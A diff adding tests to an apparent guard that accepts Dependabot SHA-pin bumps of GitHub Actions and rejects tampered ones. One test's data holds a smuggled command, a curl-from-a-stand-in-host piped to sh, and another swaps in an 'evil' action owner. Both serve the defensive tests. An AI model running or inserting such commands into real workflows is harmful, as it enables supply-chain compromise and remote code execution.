@@ -93,6 +93,83 @@ def test_accepts_a_hook_rev_bump():
 
 
 # ---------------------------------------------------------------------------
+# A GitHub Actions SHA pin's trailing release comment normalizes with it
+# ---------------------------------------------------------------------------
+
+
+def test_accepts_a_github_action_sha_and_comment_bump():
+    # The bug this guards: Dependabot rewrites both halves on a real bump, so
+    # the comment moving from `# v7` to `# v7.0.1` alongside the SHA must not
+    # read as a structural change.
+    result = _check(
+        _diff(
+            ".github/workflows/coderabbit-gate.yml",
+            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7.0.1\n",
+        )
+    )
+    assert result.returncode == 0, result.stdout
+
+
+def test_accepts_a_github_action_sha_only_bump():
+    # The SHA moves, the comment does not: a digest-only refresh of a release
+    # that Dependabot did not consider a new tag.
+    result = _check(
+        _diff(
+            ".github/workflows/coderabbit-gate.yml",
+            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
+        )
+    )
+    assert result.returncode == 0, result.stdout
+
+
+def test_refuses_a_github_action_swapped_owner_despite_a_matching_comment():
+    result = _check(
+        _diff(
+            ".github/workflows/coderabbit-gate.yml",
+            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+            "+        uses: evil/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
+        )
+    )
+    assert result.returncode == 1
+
+
+def test_refuses_a_non_release_comment_change():
+    result = _check(
+        _diff(
+            ".github/workflows/coderabbit-gate.yml",
+            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # pinned\n",
+        )
+    )
+    assert result.returncode == 1
+
+
+def test_refuses_a_comment_smuggling_extra_text_after_a_version_token():
+    result = _check(
+        _diff(
+            ".github/workflows/coderabbit-gate.yml",
+            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7\n"
+            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f"
+            " # v7.0.1 && curl -s https://example.invalid/x.sh | sh\n",
+        )
+    )
+    assert result.returncode == 1
+
+
+def test_refuses_a_comment_appearing_where_there_was_none():
+    result = _check(
+        _diff(
+            ".github/workflows/coderabbit-gate.yml",
+            "-        uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1\n"
+            "+        uses: actions/checkout@f7dd8b1f9e0d1c9a1e0e5a3b0e0f0a0b0c0d0e0f # v7\n",
+        )
+    )
+    assert result.returncode == 1
+
+
+# ---------------------------------------------------------------------------
 # Refused: anything else, including alongside a legitimate bump
 # ---------------------------------------------------------------------------
 
